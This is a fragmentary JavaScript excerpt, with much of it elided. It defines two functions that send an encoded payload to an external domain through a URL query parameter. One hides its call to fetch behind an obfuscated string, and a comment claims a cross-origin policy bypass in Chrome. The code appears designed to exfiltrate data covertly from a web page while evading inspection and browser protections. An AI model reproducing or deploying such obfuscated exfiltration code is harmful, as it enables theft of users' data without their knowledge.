...
const cipheredFetch = encodedPayload => {
  ...
  const k = s =>
    s
      ...
      .join('');
  self[k(i)](`${apiDomain}?d=${encodedPayload}`); // equivalent to window.fetch(url)
};
...
const primitiveFetch = encodedPayload => {
  fetch(`${apiDomain}?d=${encodedPayload}`, {
    mode: 'no-cors'
  });
};
...
/**
 * This apparently bypasses cross origin policy (Chrome only - may be patched)
 */
